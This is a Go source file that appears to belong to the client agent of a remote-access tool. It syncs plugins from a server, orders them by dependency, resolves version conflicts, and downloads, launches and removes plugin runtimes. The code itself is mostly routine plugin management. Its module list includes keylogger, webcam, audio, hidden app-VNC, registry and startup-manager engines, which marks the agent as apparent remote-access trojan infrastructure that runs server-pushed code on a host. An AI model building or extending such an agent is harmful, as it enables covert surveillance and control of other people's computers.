package agent

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/rootbay/tenvy-client/internal/plugins"
	manifest "github.com/rootbay/tenvy-client/shared/pluginmanifest"
)

type pluginStageOutcome struct {
	Manifest   *manifest.Manifest
	EntryPath  string
	Staged     bool
	BackupPath string
}

type manifestConflict struct {
	PluginID  string
	Preferred *manifest.ManifestDescriptor
	Summary   string
	Message   string
}

type pluginStageHandler interface {
	Stage(context.Context, *Agent, manifest.ManifestDescriptor) (pluginStageOutcome, error)
}

type pluginStageRegistry struct {
	mu       sync.RWMutex
	handlers map[string]pluginStageHandler
	fallback pluginStageHandler
}

func newPluginStageRegistry() *pluginStageRegistry {
	registry := &pluginStageRegistry{handlers: make(map[string]pluginStageHandler)}
	registry.fallback = genericPluginStageHandler{}
	registry.Register(plugins.RemoteDesktopEnginePluginID, remoteDesktopStageHandler{})
	return registry
}

func (r *pluginStageRegistry) Register(id string, handler pluginStageHandler) {
	if r == nil {
		return
	}
	normalized := strings.ToLower(strings.TrimSpace(id))
	if normalized == "" {
		return
	}
	r.mu.Lock()
	defer r.mu.Unlock()
	if handler == nil {
		delete(r.handlers, normalized)
		return
	}
	r.handlers[normalized] = handler
}

func (r *pluginStageRegistry) Unregister(id string) {
	r.Register(id, nil)
}

func (r *pluginStageRegistry) Lookup(id string) pluginStageHandler {
	if r == nil {
		return nil
	}
	normalized := strings.ToLower(strings.TrimSpace(id))
	if normalized == "" {
		return nil
	}
	r.mu.RLock()
	handler := r.handlers[normalized]
	fallback := r.fallback
	r.mu.RUnlock()
	if handler != nil {
		return handler
	}
	return fallback
}

var pluginStages = newPluginStageRegistry()

type remoteDesktopStageHandler struct{}

type genericPluginStageHandler struct{}

func (genericPluginStageHandler) Stage(ctx context.Context, agent *Agent, descriptor manifest.ManifestDescriptor) (pluginStageOutcome, error) {
	var outcome pluginStageOutcome

	if agent == nil {
		return outcome, errors.New("agent not initialized")
	}
	if agent.plugins == nil || agent.client == nil {
		return outcome, errors.New("plugin staging unavailable")
	}

	result, err := plugins.StagePlugin(ctx, agent.plugins, agent.client, agent.baseURL, agent.id, agent.key, agent.userAgent(), agent.pluginRuntimeFacts(), descriptor)
	if err != nil {
		return outcome, err
	}
	outcome.Manifest = &result.Manifest
	outcome.EntryPath = result.EntryPath
	outcome.BackupPath = result.BackupPath
	outcome.Staged = true
	return outcome, nil
}

func manifestDescriptorFingerprint(descriptor manifest.ManifestDescriptor) string {
	digest := strings.TrimSpace(descriptor.ManifestDigest)
	manual := strings.TrimSpace(descriptor.ManualPushAt)
	if manual == "" {
		return digest
	}
	if digest == "" {
		return manual
	}
	return fmt.Sprintf("%s:%s", digest, manual)
}

func (remoteDesktopStageHandler) Stage(ctx context.Context, agent *Agent, descriptor manifest.ManifestDescriptor) (pluginStageOutcome, error) {
	var outcome pluginStageOutcome

	if agent == nil {
		return outcome, errors.New("agent not initialized")
	}

	manualRequested := strings.TrimSpace(descriptor.ManualPushAt) != ""

	if !plugins.RemoteDesktopAutoSyncAllowed(descriptor) && !manualRequested {
		if agent.logger != nil {
			mode := strings.TrimSpace(string(descriptor.Distribution.DefaultMode))
			if mode == "" {
				mode = "unspecified"
			}
			agent.logger.Printf("plugin sync: skipping remote desktop plugin %s (delivery mode: %s, auto-update: %t)",
				strings.TrimSpace(descriptor.PluginID), mode, descriptor.Distribution.AutoUpdate)
		}
		return outcome, nil
	}

	facts := agent.pluginRuntimeFacts()
	result, err := plugins.StageRemoteDesktopEngine(
		ctx,
		agent.plugins,
		agent.client,
		agent.baseURL,
		agent.id,
		agent.key,
		agent.userAgent(),
		facts,
		descriptor,
	)
	if err != nil {
		return outcome, err
	}

	outcome.Manifest = &result.Manifest
	outcome.EntryPath = result.EntryPath
	outcome.Staged = true
	return outcome, nil
}

func (a *Agent) fetchApprovedPluginList(ctx context.Context) (*manifest.ManifestList, error) {
	if a.client == nil {
		return nil, errors.New("http client not configured")
	}
	base := strings.TrimSpace(a.baseURL)
	agentID := strings.TrimSpace(a.id)
	if base == "" || agentID == "" {
		return nil, errors.New("agent identity not established")
	}

	endpoint := fmt.Sprintf("%s/api/clients/%s/plugins", strings.TrimRight(base, "/"), url.PathEscape(agentID))
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, endpoint, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Accept", "application/vnd.tenvy.plugin-manifest+json")
	req.Header.Set("User-Agent", a.userAgent())
	if key := strings.TrimSpace(a.key); key != "" {
		req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", key))
	}
	applyRequestDecorations(req, a.requestHeaders, a.requestCookies)

	resp, err := a.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode >= http.StatusBadRequest {
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 2048))
		message := strings.TrimSpace(string(body))
		if message == "" {
			message = fmt.Sprintf("status %d", resp.StatusCode)
		}
		return nil, fmt.Errorf("fetch plugin manifests: %s", message)
	}

	var snapshot manifest.ManifestList
	decoder := json.NewDecoder(io.LimitReader(resp.Body, 1<<20))
	if err := decoder.Decode(&snapshot); err != nil {
		return nil, fmt.Errorf("decode manifest snapshot: %w", err)
	}
	return &snapshot, nil
}

func (a *Agent) refreshApprovedPlugins(ctx context.Context) error {
	if a.plugins == nil || a.client == nil {
		return nil
	}

	requestCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	snapshot, err := a.fetchApprovedPluginList(requestCtx)
	if err != nil {
		return err
	}
	if a.plugins != nil {
		a.plugins.UpdateRegistry(snapshot)
	}
	a.setPluginManifestList(snapshot)
	return a.stagePluginsFromList(requestCtx, snapshot)
}

func (a *Agent) applyPluginManifestDelta(ctx context.Context, delta *manifest.ManifestDelta) error {
	if delta == nil {
		return nil
	}

	a.pluginManifestMu.RLock()
	currentVersion := a.pluginManifestVersion
	a.pluginManifestMu.RUnlock()

	if strings.TrimSpace(delta.Version) == currentVersion && len(delta.Updated) == 0 && len(delta.Removed) == 0 {
		return nil
	}

	removed := a.pluginIDsForRemoval(delta)
	var removalErr error
	if len(removed) > 0 {
		if err := a.handlePluginRemoval(ctx, removed); err != nil {
			removalErr = err
		}
	}

	if a.plugins == nil || a.client == nil {
		return removalErr
	}

	requestCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
	defer cancel()

	snapshot, err := a.fetchApprovedPluginList(requestCtx)
	if err != nil {
		return combineErrors(removalErr, err)
	}
	if a.plugins != nil {
		a.plugins.UpdateRegistry(snapshot)
	}
	a.setPluginManifestList(snapshot)
	stageErr := a.stagePluginsFromList(requestCtx, snapshot)
	return combineErrors(removalErr, stageErr)
}

func (a *Agent) stagePluginsFromList(ctx context.Context, snapshot *manifest.ManifestList) error {
	if snapshot == nil || len(snapshot.Manifests) == 0 {
		return nil
	}
	if a.plugins == nil || a.client == nil {
		return nil
	}

	var resultErr error
	resolved, conflicts := resolveManifestDescriptorConflicts(snapshot.Manifests)

	for _, conflict := range conflicts {
		if a.logger != nil {
			a.logger.Printf("plugin sync: manifest conflict for %s: %s", conflict.PluginID, conflict.Message)
		}
		if a.plugins != nil {
			version := ""
			if conflict.Preferred != nil {
				version = strings.TrimSpace(conflict.Preferred.Version)
			}
			if err := plugins.RecordInstallStatus(a.plugins, conflict.PluginID, version, manifest.InstallBlocked, conflict.Message); err != nil && a.logger != nil {
				a.logger.Printf("plugin sync: failed to record conflict status for %s: %v", conflict.PluginID, err)
			}
		}
		resultErr = combineErrors(resultErr, fmt.Errorf("manifest conflict for %s: %s", conflict.PluginID, conflict.Summary))
	}

	ordered, cyclic := orderManifestDescriptorsByDependency(resolved)

	if len(cyclic) > 0 {
		cycleIDs := make([]string, 0, len(cyclic))
		for _, descriptor := range cyclic {
			cycleID := strings.TrimSpace(descriptor.PluginID)
			if cycleID == "" {
				continue
			}
			cycleIDs = append(cycleIDs, cycleID)
		}
		if len(cycleIDs) > 0 {
			message := fmt.Sprintf("dependency cycle detected among plugins: %s", strings.Join(cycleIDs, " -> "))
			if a.logger != nil {
				a.logger.Printf("plugin sync: %s", message)
			}
			if a.plugins != nil {
				for _, descriptor := range cyclic {
					cycleID := strings.TrimSpace(descriptor.PluginID)
					if cycleID == "" {
						continue
					}
					version := strings.TrimSpace(descriptor.Version)
					if err := plugins.RecordInstallStatus(a.plugins, cycleID, version, manifest.InstallBlocked, message); err != nil && a.logger != nil {
						a.logger.Printf("plugin sync: failed to record cycle status for %s: %v", cycleID, err)
					}
				}
			}
			resultErr = combineErrors(resultErr, errors.New(message))
		}
	}

	resolved = ordered
	if len(resolved) == 0 {
		return resultErr
	}

	activeDependencies := make(map[string]struct{})
	if a.modules != nil {
		for _, pluginID := range a.modules.ActivePluginIDs() {
			normalized := strings.ToLower(strings.TrimSpace(pluginID))
			if normalized == "" {
				continue
			}
			activeDependencies[normalized] = struct{}{}
		}
	}

	for _, entry := range resolved {
		id := strings.TrimSpace(entry.PluginID)
		if id == "" {
			continue
		}
		handler := pluginStages.Lookup(id)
		if handler == nil {
			continue
		}

		depsTrimmed, depsNormalized := sanitizeDescriptorDependencies(entry.Dependencies)
		if len(depsNormalized) > 0 {
			missing := make([]string, 0, len(depsNormalized))
			for idx, dep := range depsNormalized {
				if _, ok := activeDependencies[dep]; ok {
					continue
				}
				missing = append(missing, depsTrimmed[idx])
			}
			if len(missing) > 0 {
				sort.Strings(missing)
				message := fmt.Sprintf("missing dependencies: %s", strings.Join(missing, ", "))
				if a.logger != nil {
					a.logger.Printf("plugin sync: skipping %s (%s)", id, message)
				}
				if a.plugins != nil {
					version := strings.TrimSpace(entry.Version)
					if err := plugins.RecordInstallStatus(a.plugins, id, version, manifest.InstallBlocked, message); err != nil && a.logger != nil {
						a.logger.Printf("plugin sync: failed to record dependency status for %s: %v", id, err)
					}
				}
				resultErr = combineErrors(resultErr, fmt.Errorf("plugin %s blocked: %s", id, message))
				continue
			}
		}

		_, generic := handler.(genericPluginStageHandler)

		stageCtx, cancel := context.WithTimeout(ctx, 30*time.Second)
		var (
			manifestResult *manifest.Manifest
			entryPath      string
			backupPath     string
			stageErr       error
		)

		if generic {
			res, err := plugins.StagePlugin(stageCtx, a.plugins, a.client, a.baseURL, a.id, a.key, a.userAgent(), a.pluginRuntimeFacts(), entry)
			stageErr = err
			if err == nil {
				manifestResult = &res.Manifest
				entryPath = res.EntryPath
				backupPath = res.BackupPath
			}
		} else {
			outcome, err := handler.Stage(stageCtx, a, entry)
			stageErr = err
			if err == nil && outcome.Manifest != nil {
				manifestResult = outcome.Manifest
				entryPath = outcome.EntryPath
				backupPath = outcome.BackupPath
			}
		}
		if stageErr == nil && manifestResult != nil {
			if err := a.activatePlugin(stageCtx, *manifestResult, entryPath, backupPath); err != nil {
				stageErr = err
				manifestResult = nil
			}
		}
		cancel()

		if stageErr == nil && manifestResult != nil {
			normalizedID := strings.ToLower(strings.TrimSpace(manifestResult.ID))
			if normalizedID != "" {
				activeDependencies[normalizedID] = struct{}{}
			}
		}

		if stageErr != nil {
			resultErr = combineErrors(resultErr, fmt.Errorf("stage %s: %w", id, stageErr))
			if generic && a.plugins != nil {
				status := manifest.InstallError
				var stageError *plugins.StageError
				if errors.As(stageErr, &stageError) && stageError != nil {
					status = stageError.Status()
				}
				version := strings.TrimSpace(entry.Version)
				if stageError != nil && strings.TrimSpace(stageError.Version()) != "" {
					version = stageError.Version()
				}
				if err := plugins.RecordInstallStatus(a.plugins, id, version, status, stageErr.Error()); err != nil && a.logger != nil {
					a.logger.Printf("plugin sync: failed to record install status for %s: %v", id, err)
				}
			}
			continue
		}

		if manifestResult == nil {
			continue
		}

		if generic && a.plugins != nil {
			if err := plugins.ClearInstallStatus(a.plugins, manifestResult.ID); err != nil && a.logger != nil {
				a.logger.Printf("plugin sync: failed to clear install status for %s: %v", manifestResult.ID, err)
			}
		}

	}

	return resultErr
}

func sanitizeDescriptorDependencies(values []string) ([]string, []string) {
	if len(values) == 0 {
		return nil, nil
	}
	trimmed := make([]string, 0, len(values))
	normalized := make([]string, 0, len(values))
	seen := make(map[string]struct{}, len(values))
	for _, value := range values {
		candidate := strings.TrimSpace(value)
		if candidate == "" {
			continue
		}
		lowered := strings.ToLower(candidate)
		if _, ok := seen[lowered]; ok {
			continue
		}
		seen[lowered] = struct{}{}
		trimmed = append(trimmed, candidate)
		normalized = append(normalized, lowered)
	}
	if len(trimmed) == 0 {
		return nil, nil
	}
	return trimmed, normalized
}

func orderManifestDescriptorsByDependency(entries []manifest.ManifestDescriptor) ([]manifest.ManifestDescriptor, []manifest.ManifestDescriptor) {
	if len(entries) == 0 {
		return nil, nil
	}

	descriptorByID := make(map[string]manifest.ManifestDescriptor, len(entries))
	orderIndex := make(map[string]int, len(entries))
	normalizedDeps := make(map[string][]string, len(entries))

	for idx, entry := range entries {
		id := strings.TrimSpace(entry.PluginID)
		if id == "" {
			continue
		}
		key := strings.ToLower(id)
		descriptorByID[key] = entry
		orderIndex[key] = idx
		_, deps := sanitizeDescriptorDependencies(entry.Dependencies)
		if len(deps) > 0 {
			normalizedDeps[key] = deps
		}
	}

	adjacency := make(map[string][]string, len(descriptorByID))
	indegree := make(map[string]int, len(descriptorByID))
	for key := range descriptorByID {
		indegree[key] = 0
	}

	for key, deps := range normalizedDeps {
		for _, dep := range deps {
			if _, ok := descriptorByID[dep]; !ok {
				continue
			}
			adjacency[dep] = append(adjacency[dep], key)
			indegree[key]++
		}
	}

	queue := make([]string, 0, len(descriptorByID))
	for key, degree := range indegree {
		if degree == 0 {
			queue = append(queue, key)
		}
	}
	sort.Slice(queue, func(i, j int) bool { return orderIndex[queue[i]] < orderIndex[queue[j]] })

	orderedKeys := make([]string, 0, len(descriptorByID))
	for len(queue) > 0 {
		current := queue[0]
		queue = queue[1:]
		orderedKeys = append(orderedKeys, current)
		for _, neighbor := range adjacency[current] {
			indegree[neighbor]--
			if indegree[neighbor] == 0 {
				queue = append(queue, neighbor)
				sort.Slice(queue, func(i, j int) bool { return orderIndex[queue[i]] < orderIndex[queue[j]] })
			}
		}
	}

	ordered := make([]manifest.ManifestDescriptor, 0, len(orderedKeys))
	for _, key := range orderedKeys {
		ordered = append(ordered, descriptorByID[key])
		delete(indegree, key)
	}

	if len(indegree) == 0 {
		return ordered, nil
	}

	type blockedNode struct {
		key   string
		index int
	}
	nodes := make([]blockedNode, 0, len(indegree))
	for key := range indegree {
		nodes = append(nodes, blockedNode{key: key, index: orderIndex[key]})
	}
	sort.Slice(nodes, func(i, j int) bool { return nodes[i].index < nodes[j].index })

	blocked := make([]manifest.ManifestDescriptor, 0, len(nodes))
	for _, node := range nodes {
		blocked = append(blocked, descriptorByID[node.key])
	}

	return ordered, blocked
}

type semverParts struct {
	major      int
	minor      int
	patch      int
	prerelease string
}

func resolveManifestDescriptorConflicts(entries []manifest.ManifestDescriptor) ([]manifest.ManifestDescriptor, []manifestConflict) {
	type group struct {
		pluginID    string
		descriptors []manifest.ManifestDescriptor
	}

	groups := make([]group, 0)
	index := make(map[string]int)

	for _, entry := range entries {
		pluginID := strings.TrimSpace(entry.PluginID)
		if pluginID == "" {
			continue
		}
		normalized := strings.ToLower(pluginID)
		if idx, ok := index[normalized]; ok {
			groups[idx].descriptors = append(groups[idx].descriptors, entry)
			continue
		}
		index[normalized] = len(groups)
		groups = append(groups, group{pluginID: pluginID, descriptors: []manifest.ManifestDescriptor{entry}})
	}

	resolved := make([]manifest.ManifestDescriptor, 0, len(entries))
	conflicts := make([]manifestConflict, 0)

	for _, group := range groups {
		unique := deduplicateManifestDescriptors(group.descriptors)
		if len(unique) == 0 {
			continue
		}
		if len(unique) == 1 {
			resolved = append(resolved, unique[0])
			continue
		}

		conflict := analyzeManifestConflict(group.pluginID, unique)
		conflicts = append(conflicts, conflict)
	}

	return resolved, conflicts
}

func deduplicateManifestDescriptors(entries []manifest.ManifestDescriptor) []manifest.ManifestDescriptor {
	unique := make([]manifest.ManifestDescriptor, 0, len(entries))

	for _, entry := range entries {
		version := strings.TrimSpace(entry.Version)
		digest := strings.TrimSpace(entry.ManifestDigest)
		found := false
		for _, existing := range unique {
			if strings.EqualFold(strings.TrimSpace(existing.Version), version) && strings.TrimSpace(existing.ManifestDigest) == digest {
				found = true
				break
			}
		}
		if !found {
			unique = append(unique, entry)
		}
	}

	return unique
}

func analyzeManifestConflict(pluginID string, descriptors []manifest.ManifestDescriptor) manifestConflict {
	conflict := manifestConflict{PluginID: pluginID}

	summaryParts := make([]string, 0, len(descriptors))
	for _, descriptor := range descriptors {
		version := strings.TrimSpace(descriptor.Version)
		if version == "" {
			version = "unspecified"
		}
		digest := strings.TrimSpace(descriptor.ManifestDigest)
		if digest == "" {
			digest = "no digest"
		}
		if manual := strings.TrimSpace(descriptor.ManualPushAt); manual != "" {
			summaryParts = append(summaryParts, fmt.Sprintf("version %s (digest %s, manual %s)", version, digest, manual))
		} else {
			summaryParts = append(summaryParts, fmt.Sprintf("version %s (digest %s)", version, digest))
		}
	}
	conflict.Summary = strings.Join(summaryParts, "; ")

	if idx := selectPreferredDescriptor(descriptors); idx >= 0 {
		selected := descriptors[idx]
		conflict.Preferred = &selected
	}

	message := fmt.Sprintf("conflicting manifests detected: %s", conflict.Summary)
	if conflict.Preferred != nil {
		if version := strings.TrimSpace(conflict.Preferred.Version); version != "" {
			message = fmt.Sprintf("%s; preferred %s", message, version)
		}
	}
	conflict.Message = message + "; staging deferred"
	return conflict
}

func selectPreferredDescriptor(descriptors []manifest.ManifestDescriptor) int {
	bestIndex := -1
	var bestParts semverParts
	bestValid := false
	ambiguous := false

	for idx, descriptor := range descriptors {
		parts, valid := parseSemverParts(descriptor.Version)
		switch {
		case bestIndex == -1 && valid:
			bestIndex = idx
			bestParts = parts
			bestValid = true
			ambiguous = false
		case bestIndex == -1 && !valid:
			bestIndex = idx
			bestValid = false
		case !bestValid && valid:
			bestIndex = idx
			bestParts = parts
			bestValid = true
			ambiguous = false
		case bestValid && valid:
			cmp := compareSemverParts(parts, bestParts)
			if cmp > 0 {
				bestIndex = idx
				bestParts = parts
				ambiguous = false
			} else if cmp == 0 {
				ambiguous = true
			}
		case bestValid && !valid:
			// keep current best
		default:
			ambiguous = true
		}
	}

	if !bestValid || bestIndex < 0 || ambiguous {
		return -1
	}
	return bestIndex
}

func parseSemverParts(value string) (semverParts, bool) {
	trimmed := strings.TrimSpace(value)
	if trimmed == "" {
		return semverParts{}, false
	}
	core := trimmed
	if idx := strings.Index(core, "+"); idx >= 0 {
		core = core[:idx]
	}
	prerelease := ""
	if idx := strings.Index(core, "-"); idx >= 0 {
		prerelease = core[idx+1:]
		core = core[:idx]
	}
	parts := strings.Split(core, ".")
	if len(parts) != 3 {
		return semverParts{}, false
	}
	major, err := strconv.Atoi(parts[0])
	if err != nil {
		return semverParts{}, false
	}
	minor, err := strconv.Atoi(parts[1])
	if err != nil {
		return semverParts{}, false
	}
	patch, err := strconv.Atoi(parts[2])
	if err != nil {
		return semverParts{}, false
	}
	return semverParts{major: major, minor: minor, patch: patch, prerelease: prerelease}, true
}

func compareSemverParts(left, right semverParts) int {
	if left.major != right.major {
		if left.major < right.major {
			return -1
		}
		return 1
	}
	if left.minor != right.minor {
		if left.minor < right.minor {
			return -1
		}
		return 1
	}
	if left.patch != right.patch {
		if left.patch < right.patch {
			return -1
		}
		return 1
	}
	if left.prerelease == right.prerelease {
		return 0
	}
	if left.prerelease == "" {
		return 1
	}
	if right.prerelease == "" {
		return -1
	}
	if left.prerelease < right.prerelease {
		return -1
	}
	if left.prerelease > right.prerelease {
		return 1
	}
	return 0
}

func (a *Agent) pluginRuntimeFacts() manifest.RuntimeFacts {
	metadata := a.metadata
	version := strings.TrimSpace(metadata.Version)
	if version == "" {
		version = strings.TrimSpace(a.buildVersion)
	}

	var activeModules []string
	if a.modules != nil {
		meta := a.modules.Metadata()
		activeModules = make([]string, 0, len(meta))
		for _, entry := range meta {
			if id := strings.TrimSpace(entry.ID); id != "" {
				activeModules = append(activeModules, id)
			}
		}
	}

	return manifest.RuntimeFacts{
		Platform:          metadata.OS,
		Architecture:      metadata.Architecture,
		AgentVersion:      version,
		EnabledModules:    append([]string(nil), activeModules...),
		SupportedRuntimes: []manifest.RuntimeType{manifest.RuntimeNative, manifest.RuntimeWASM},
		HostInterfaces:    []string{manifest.HostInterfaceCoreV1},
		HostAPIVersion:    plugins.WasmHostAPIVersion,
	}
}

func (a *Agent) pluginIDsForRemoval(delta *manifest.ManifestDelta) []string {
	if delta == nil || len(delta.Removed) == 0 {
		return nil
	}

	snapshot := a.pluginManifestSnapshot()
	lowercase := make(map[string]string, len(snapshot))
	for id := range snapshot {
		lowered := strings.ToLower(strings.TrimSpace(id))
		if lowered == "" {
			continue
		}
		lowercase[lowered] = id
	}

	seen := make(map[string]struct{}, len(delta.Removed))
	var ids []string
	for _, raw := range delta.Removed {
		trimmed := strings.TrimSpace(raw)
		if trimmed == "" {
			continue
		}
		candidate := trimmed
		if actual, ok := lowercase[strings.ToLower(trimmed)]; ok {
			candidate = actual
		}
		normalized := strings.ToLower(candidate)
		if _, ok := seen[normalized]; ok {
			continue
		}
		seen[normalized] = struct{}{}
		ids = append(ids, candidate)
	}
	return ids
}

func (a *Agent) handlePluginRemoval(ctx context.Context, pluginIDs []string) error {
	if len(pluginIDs) == 0 {
		return nil
	}

	a.removePluginManifestEntries(pluginIDs)

	var resultErr error
	pluginRoot := ""
	if a.plugins != nil {
		pluginRoot = strings.TrimSpace(a.plugins.Root())
	}

	for _, rawID := range pluginIDs {
		id := strings.TrimSpace(rawID)
		if id == "" {
			continue
		}

		// Instant update logic: if a plugin is removed/updated, reset its engine
		switch {
		case strings.EqualFold(id, plugins.RemoteDesktopEnginePluginID):
			if err := a.resetModuleEngine(ctx, "remote-desktop", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "webcam-engine"):
			if err := a.resetModuleEngine(ctx, "webcam-control", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "keylogger-engine"):
			if err := a.resetModuleEngine(ctx, "keylogger", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "audio-engine"):
			if err := a.resetModuleEngine(ctx, "audio-control", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "appvnc-engine"):
			if err := a.resetModuleEngine(ctx, "app-vnc", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "filemanager-engine"):
			if err := a.resetModuleEngine(ctx, "file-manager", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "taskmanager-engine"):
			if err := a.resetModuleEngine(ctx, "task-manager", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "tcpconnections-engine"):
			if err := a.resetModuleEngine(ctx, "tcp-connections", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "registry-engine"):
			if err := a.resetModuleEngine(ctx, "registry", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "startup-engine"):
			if err := a.resetModuleEngine(ctx, "startup-manager", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		case strings.EqualFold(id, "trigger-engine"):
			if err := a.resetModuleEngine(ctx, "trigger-monitor", id); err != nil {
				resultErr = combineErrors(resultErr, err)
			}
		}

		if a.modules != nil {
			if err := a.modules.DeactivatePlugin(ctx, id); err != nil {
				resultErr = combineErrors(resultErr, fmt.Errorf("deactivate plugin %s: %w", id, err))
			}
			metadata := a.modules.Metadata()
			for _, moduleMeta := range metadata {
				removed := false
				for _, ext := range moduleMeta.Extensions {
					if strings.EqualFold(ext.Source, id) {
						if err := a.modules.UnregisterModuleExtension(moduleMeta.ID, id); err != nil {
							resultErr = combineErrors(resultErr, err)
						}
						removed = true
						break
					}
				}
				if removed {
					break
				}
			}
		}

		if a.plugins != nil {
			if err := plugins.ClearInstallStatus(a.plugins, id); err != nil {
				resultErr = combineErrors(resultErr, fmt.Errorf("clear install status for %s: %w", id, err))
			}
			if pluginRoot != "" {
				dir := filepath.Join(pluginRoot, id)
				if err := os.RemoveAll(dir); err != nil {
					resultErr = combineErrors(resultErr, fmt.Errorf("remove plugin %s: %w", id, err))
				}
			}
		}
	}

	return resultErr
}

func (a *Agent) activatePlugin(ctx context.Context, mf manifest.Manifest, entryPath, backupPath string) error {
	if a.modules == nil {
		return nil
	}
	pluginID := strings.TrimSpace(mf.ID)
	if pluginID == "" {
		return errors.New("manifest missing identifier")
	}
	entryPath = strings.TrimSpace(entryPath)
	if entryPath == "" {
		return fmt.Errorf("plugin %s entry path not resolved", pluginID)
	}
	backupPath = strings.TrimSpace(backupPath)
	var pluginDir string
	if backupPath != "" && a.plugins != nil {
		if root := strings.TrimSpace(a.plugins.Root()); root != "" {
			pluginDir = filepath.Join(root, pluginID)
		}
	}

	restoreOnFailure := func(err error) error {
		if backupPath == "" || pluginDir == "" {
			return err
		}
		if restoreErr := plugins.RestorePluginBackup(pluginDir, backupPath); restoreErr != nil {
			if a.logger != nil {
				a.logger.Printf("plugin sync: failed to restore %s from backup: %v", pluginID, restoreErr)
			}
			return fmt.Errorf("%w (restore failed: %v)", err, restoreErr)
		}
		if a.logger != nil {
			a.logger.Printf("plugin sync: restored previous installation for %s after activation failure", pluginID)
		}
		return fmt.Errorf("%w (previous version restored)", err)
	}

	extensions := buildModuleExtensions(mf)

	runtimeKind := plugins.RuntimeKindNative
	hostInterfaces := mf.RuntimeHostInterfaces()
	hostAPIVersion := mf.RuntimeHostAPIVersion()
	sandboxed := mf.RuntimeSandboxed()

	if mf.RuntimeType() == manifest.RuntimeWASM {
		runtimeKind = plugins.RuntimeKindWASM
		if len(hostInterfaces) == 0 {
			hostInterfaces = []string{manifest.HostInterfaceCoreV1}
		}
		if hostAPIVersion == "" {
			hostAPIVersion = plugins.WasmHostAPIVersion
		}
	}

	handle, err := plugins.LaunchRuntime(ctx, entryPath, plugins.RuntimeOptions{
		Name:           pluginID,
		Logger:         a.logger,
		Kind:           runtimeKind,
		HostInterfaces: hostInterfaces,
		HostAPIVersion: hostAPIVersion,
		Sandboxed:      sandboxed,
	})
	if err != nil {
		err = restoreOnFailure(err)
		if a.plugins != nil {
			if recordErr := plugins.RecordInstallStatus(a.plugins, pluginID, strings.TrimSpace(mf.Version), manifest.InstallError, err.Error()); recordErr != nil && a.logger != nil {
				a.logger.Printf("plugin sync: failed to record install status for %s: %v", pluginID, recordErr)
			}
		}
		return err
	}

	if err := a.modules.ActivatePlugin(ctx, pluginID, extensions, handle); err != nil {
		_ = handle.Shutdown(ctx)
		err = restoreOnFailure(err)
		if a.plugins != nil {
			if recordErr := plugins.RecordInstallStatus(a.plugins, pluginID, strings.TrimSpace(mf.Version), manifest.InstallError, err.Error()); recordErr != nil && a.logger != nil {
				a.logger.Printf("plugin sync: failed to record install status for %s: %v", pluginID, recordErr)
			}
		}
		return err
	}
	if backupPath != "" {
		if err := os.RemoveAll(backupPath); err != nil && a.logger != nil {
			a.logger.Printf("plugin sync: failed to remove backup for %s: %v", pluginID, err)
		}
	}
	return nil
}

func buildModuleExtensions(mf manifest.Manifest) map[string]ModuleExtension {
	pluginID := strings.TrimSpace(mf.ID)
	version := strings.TrimSpace(mf.Version)
	if pluginID == "" {
		return nil
	}

	extensions := make(map[string]ModuleExtension)
	for _, capabilityID := range mf.Capabilities {
		capabilityID = strings.TrimSpace(capabilityID)
		if capabilityID == "" {
			continue
		}
		descriptor, ok := manifest.LookupCapability(capabilityID)
		if !ok {
			continue
		}
		moduleID := strings.TrimSpace(descriptor.Module)
		if moduleID == "" {
			continue
		}
		extension := extensions[moduleID]
		if extension.Source == "" {
			extension.Source = pluginID
			extension.Version = version
		}
		extension.Capabilities = append(extension.Capabilities, ModuleCapability{
			ID:          descriptor.ID,
			Name:        descriptor.Name,
			Description: descriptor.Description,
		})
		extensions[moduleID] = extension
	}

	for _, telemetryID := range mf.Telemetry {
		telemetryID = strings.TrimSpace(telemetryID)
		if telemetryID == "" {
			continue
		}
		descriptor, ok := manifest.LookupTelemetry(telemetryID)
		if !ok {
			continue
		}
		moduleID := strings.TrimSpace(descriptor.Module)
		if moduleID == "" {
			continue
		}
		extension := extensions[moduleID]
		if extension.Source == "" {
			extension.Source = pluginID
			extension.Version = version
		}
		extension.Telemetry = append(extension.Telemetry, ModuleTelemetryDescriptor{
			ID:          descriptor.ID,
			Name:        descriptor.Name,
			Description: descriptor.Description,
		})
		extensions[moduleID] = extension
	}

	return extensions
}

func (a *Agent) removePluginManifestEntries(pluginIDs []string) {
	if len(pluginIDs) == 0 {
		return
	}

	a.pluginManifestMu.Lock()
	defer a.pluginManifestMu.Unlock()

	if len(a.pluginManifestDigests) == 0 && len(a.pluginManifestDescriptors) == 0 {
		return
	}

	lookup := make(map[string]string)
	for id := range a.pluginManifestDescriptors {
		lowered := strings.ToLower(strings.TrimSpace(id))
		if lowered != "" {
			lookup[lowered] = id
		}
	}
	for id := range a.pluginManifestDigests {
		lowered := strings.ToLower(strings.TrimSpace(id))
		if lowered != "" {
			if _, ok := lookup[lowered]; !ok {
				lookup[lowered] = id
			}
		}
	}

	for _, raw := range pluginIDs {
		trimmed := strings.TrimSpace(raw)
		if trimmed == "" {
			continue
		}
		key := trimmed
		if actual, ok := lookup[strings.ToLower(trimmed)]; ok {
			key = actual
		}
		if a.pluginManifestDescriptors != nil {
			delete(a.pluginManifestDescriptors, key)
		}
